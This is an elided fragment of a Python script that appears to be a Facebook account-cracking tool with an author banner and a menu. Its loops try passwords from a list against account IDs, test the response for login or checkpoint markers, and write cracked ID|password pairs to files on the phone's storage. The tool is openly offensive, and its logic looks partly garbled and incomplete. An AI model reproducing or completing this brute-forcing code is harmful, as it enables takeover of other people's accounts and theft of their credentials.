...
\33[1;37m----------------------------------------------
→   Owner      :  Md. Samir Talukder Apurbo 
→   Facebook   :  Samir Talukder Apurbo (Protector)
→   Github     :  CYBER-SAMIR
...
def menu():
			...
			if SAMIR in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/cybersamir');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				open('/sdcard/SAMIR-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[SAMIR-CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[SAMIR-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SAMIR.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
